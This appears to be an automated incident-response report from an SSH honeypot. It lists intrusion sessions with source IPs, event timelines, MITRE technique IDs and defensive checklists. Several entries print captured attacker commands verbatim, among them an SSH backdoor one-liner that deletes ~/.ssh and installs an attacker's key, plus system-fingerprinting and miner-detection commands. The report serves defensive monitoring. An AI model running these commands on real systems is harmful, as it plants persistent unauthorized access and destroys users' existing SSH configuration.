### 🔴 HIGH · IR-78348d22922a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 05:53 |
| **Last Seen** | 2026-07-15 05:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:53:53` | `cowrie.session.connect` |
| `2026-07-15 05:53:53` | `cowrie.client.version` |
| `2026-07-15 05:53:53` | `cowrie.client.kex` |
| `2026-07-15 05:53:53` | `cowrie.login.success` |
| `2026-07-15 05:53:53` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:53:53` | `cowrie.direct-tcpip.data` |
| `2026-07-15 05:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ffc6b38ad6f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:55 |
| **Last Seen** | 2026-07-15 05:56 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:55:50` | `cowrie.session.connect` |
| `2026-07-15 05:55:52` | `cowrie.client.version` |
| `2026-07-15 05:55:52` | `cowrie.client.kex` |
| `2026-07-15 05:56:00` | `cowrie.login.success` |
| `2026-07-15 05:56:04` | `cowrie.session.params` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.success` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:04` | `cowrie.command.input` |
| `2026-07-15 05:56:06` | `cowrie.log.closed` |
| `2026-07-15 05:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbb9d4dab1ca

| Field | Detail |
|---|---|
| **Source IP** | `182.13.96[.]129` |
| **First Seen** | 2026-07-15 05:58 |
| **Last Seen** | 2026-07-15 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:58:04` | `cowrie.session.connect` |
| `2026-07-15 05:58:04` | `cowrie.client.version` |
| `2026-07-15 05:58:05` | `cowrie.client.kex` |
| `2026-07-15 05:58:06` | `cowrie.login.success` |
| `2026-07-15 05:58:07` | `cowrie.session.params` |
| `2026-07-15 05:58:07` | `cowrie.command.input` |
| `2026-07-15 05:58:07` | `cowrie.command.failed` |
| `2026-07-15 05:58:07` | `cowrie.log.closed` |
| `2026-07-15 05:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.13.96[.]129` to AbuseIPDB if not already reported
- [ ] Block `182.13.96[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8f6daaa2e9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:58 |
| **Last Seen** | 2026-07-15 05:58 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:58:14` | `cowrie.session.connect` |
| `2026-07-15 05:58:15` | `cowrie.client.version` |
| `2026-07-15 05:58:15` | `cowrie.client.kex` |
| `2026-07-15 05:58:22` | `cowrie.login.success` |
| `2026-07-15 05:58:27` | `cowrie.session.params` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.success` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:27` | `cowrie.command.input` |
| `2026-07-15 05:58:29` | `cowrie.log.closed` |
| `2026-07-15 05:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa5c530ac3f0

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-15 05:58 |
| **Last Seen** | 2026-07-15 05:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:58:50` | `cowrie.session.connect` |
| `2026-07-15 05:58:50` | `cowrie.client.version` |
| `2026-07-15 05:58:50` | `cowrie.client.kex` |
| `2026-07-15 05:58:50` | `cowrie.login.success` |
| `2026-07-15 05:58:51` | `cowrie.session.params` |
| `2026-07-15 05:58:51` | `cowrie.command.input` |
| `2026-07-15 05:58:51` | `cowrie.command.failed` |
| `2026-07-15 05:58:51` | `cowrie.log.closed` |
| `2026-07-15 05:58:52` | `cowrie.session.params` |
| `2026-07-15 05:58:52` | `cowrie.command.input` |
| `2026-07-15 05:58:52` | `cowrie.session.file_download` |
| `2026-07-15 05:58:52` | `cowrie.log.closed` |
| `2026-07-15 05:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c1e67223ad

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-15 05:58 |
| **Last Seen** | 2026-07-15 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:58:52` | `cowrie.session.connect` |
| `2026-07-15 05:58:52` | `cowrie.client.version` |
| `2026-07-15 05:58:52` | `cowrie.client.kex` |
| `2026-07-15 05:58:53` | `cowrie.login.success` |
| `2026-07-15 05:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5beec0d75e39

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-15 05:58 |
| **Last Seen** | 2026-07-15 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:58:53` | `cowrie.session.connect` |
| `2026-07-15 05:58:53` | `cowrie.client.version` |
| `2026-07-15 05:58:53` | `cowrie.client.kex` |
| `2026-07-15 05:58:54` | `cowrie.login.success` |
| `2026-07-15 05:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89632484d0f7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:00 |
| **Last Seen** | 2026-07-15 06:01 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:00:56` | `cowrie.session.connect` |
| `2026-07-15 06:00:58` | `cowrie.client.version` |
| `2026-07-15 06:00:58` | `cowrie.client.kex` |
| `2026-07-15 06:01:08` | `cowrie.login.success` |
| `2026-07-15 06:01:15` | `cowrie.session.params` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.success` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:15` | `cowrie.command.input` |
| `2026-07-15 06:01:18` | `cowrie.log.closed` |
| `2026-07-15 06:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-444481872d12

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-07-15 06:01 |
| **Last Seen** | 2026-07-15 06:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:01:22` | `cowrie.session.connect` |
| `2026-07-15 06:01:22` | `cowrie.client.version` |
| `2026-07-15 06:01:22` | `cowrie.client.kex` |
| `2026-07-15 06:01:24` | `cowrie.login.success` |
| `2026-07-15 06:01:25` | `cowrie.session.params` |
| `2026-07-15 06:01:25` | `cowrie.command.input` |
| `2026-07-15 06:01:25` | `cowrie.command.failed` |
| `2026-07-15 06:01:25` | `cowrie.log.closed` |
| `2026-07-15 06:01:26` | `cowrie.session.params` |
| `2026-07-15 06:01:26` | `cowrie.command.input` |
| `2026-07-15 06:01:27` | `cowrie.session.file_download` |
| `2026-07-15 06:01:27` | `cowrie.log.closed` |
| `2026-07-15 06:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4913fe01eed

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-07-15 06:01 |
| **Last Seen** | 2026-07-15 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:01:27` | `cowrie.session.connect` |
| `2026-07-15 06:01:27` | `cowrie.client.version` |
| `2026-07-15 06:01:27` | `cowrie.client.kex` |
| `2026-07-15 06:01:29` | `cowrie.login.success` |
| `2026-07-15 06:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4ac3ae5b56c

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-07-15 06:01 |
| **Last Seen** | 2026-07-15 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:01:29` | `cowrie.session.connect` |
| `2026-07-15 06:01:29` | `cowrie.client.version` |
| `2026-07-15 06:01:30` | `cowrie.client.kex` |
| `2026-07-15 06:01:32` | `cowrie.login.success` |
| `2026-07-15 06:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43f1ae7c45a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:03 |
| **Last Seen** | 2026-07-15 06:04 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:03:47` | `cowrie.session.connect` |
| `2026-07-15 06:03:49` | `cowrie.client.version` |
| `2026-07-15 06:03:49` | `cowrie.client.kex` |
| `2026-07-15 06:04:01` | `cowrie.login.success` |
| `2026-07-15 06:04:05` | `cowrie.session.params` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.success` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.command.input` |
| `2026-07-15 06:04:08` | `cowrie.log.closed` |
| `2026-07-15 06:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6b7094502a

| Field | Detail |
|---|---|
| **Source IP** | `61.84.211[.]107` |
| **First Seen** | 2026-07-15 06:03 |
| **Last Seen** | 2026-07-15 06:04 |
| **Session Duration** | 47s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:03:53` | `cowrie.session.connect` |
| `2026-07-15 06:03:53` | `cowrie.client.version` |
| `2026-07-15 06:03:53` | `cowrie.client.kex` |
| `2026-07-15 06:03:54` | `cowrie.login.failed` |
| `2026-07-15 06:03:55` | `cowrie.login.success` |
| `2026-07-15 06:03:56` | `cowrie.session.params` |
| `2026-07-15 06:03:56` | `cowrie.command.input` |
| `2026-07-15 06:03:56` | `cowrie.command.failed` |
| `2026-07-15 06:03:56` | `cowrie.log.closed` |
| `2026-07-15 06:03:57` | `cowrie.session.params` |
| `2026-07-15 06:03:57` | `cowrie.command.input` |
| `2026-07-15 06:03:57` | `cowrie.log.closed` |
| `2026-07-15 06:03:58` | `cowrie.session.params` |
| `2026-07-15 06:03:58` | `cowrie.command.input` |
| `2026-07-15 06:03:58` | `cowrie.log.closed` |
| `2026-07-15 06:03:59` | `cowrie.session.params` |
| `2026-07-15 06:03:59` | `cowrie.command.input` |
| `2026-07-15 06:04:00` | `cowrie.log.closed` |
| `2026-07-15 06:04:01` | `cowrie.session.params` |
| `2026-07-15 06:04:01` | `cowrie.command.input` |
| `2026-07-15 06:04:01` | `cowrie.log.closed` |
| `2026-07-15 06:04:02` | `cowrie.session.params` |
| `2026-07-15 06:04:02` | `cowrie.command.input` |
| `2026-07-15 06:04:02` | `cowrie.log.closed` |
| `2026-07-15 06:04:03` | `cowrie.session.params` |
| `2026-07-15 06:04:03` | `cowrie.command.input` |
| `2026-07-15 06:04:03` | `cowrie.log.closed` |
| `2026-07-15 06:04:04` | `cowrie.session.params` |
| `2026-07-15 06:04:04` | `cowrie.command.input` |
| `2026-07-15 06:04:05` | `cowrie.log.closed` |
| `2026-07-15 06:04:06` | `cowrie.session.params` |
| `2026-07-15 06:04:06` | `cowrie.command.input` |
| `2026-07-15 06:04:06` | `cowrie.log.closed` |
| `2026-07-15 06:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.84.211[.]107` to AbuseIPDB if not already reported
- [ ] Block `61.84.211[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97fbb48ae9f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:06 |
| **Last Seen** | 2026-07-15 06:06 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:06:34` | `cowrie.session.connect` |
| `2026-07-15 06:06:36` | `cowrie.client.version` |
| `2026-07-15 06:06:36` | `cowrie.client.kex` |
| `2026-07-15 06:06:44` | `cowrie.login.success` |
| `2026-07-15 06:06:49` | `cowrie.session.params` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.success` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:49` | `cowrie.command.input` |
| `2026-07-15 06:06:51` | `cowrie.log.closed` |
| `2026-07-15 06:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718fea2e2f40

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-15 06:07 |
| **Last Seen** | 2026-07-15 06:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:07:48` | `cowrie.session.connect` |
| `2026-07-15 06:07:49` | `cowrie.client.version` |
| `2026-07-15 06:07:49` | `cowrie.client.kex` |
| `2026-07-15 06:07:51` | `cowrie.login.success` |
| `2026-07-15 06:07:52` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a32a15cd68

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-15 06:07 |
| **Last Seen** | 2026-07-15 06:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:07:57` | `cowrie.session.connect` |
| `2026-07-15 06:07:58` | `cowrie.client.version` |
| `2026-07-15 06:07:58` | `cowrie.client.kex` |
| `2026-07-15 06:08:00` | `cowrie.login.success` |
| `2026-07-15 06:08:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ac09ead3d8

| Field | Detail |
|---|---|
| **Source IP** | `49.124.148[.]185` |
| **First Seen** | 2026-07-15 06:08 |
| **Last Seen** | 2026-07-15 06:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:08:10` | `cowrie.session.connect` |
| `2026-07-15 06:08:11` | `cowrie.client.version` |
| `2026-07-15 06:08:11` | `cowrie.client.kex` |
| `2026-07-15 06:08:13` | `cowrie.login.success` |
| `2026-07-15 06:08:14` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.148[.]185` to AbuseIPDB if not already reported
- [ ] Block `49.124.148[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

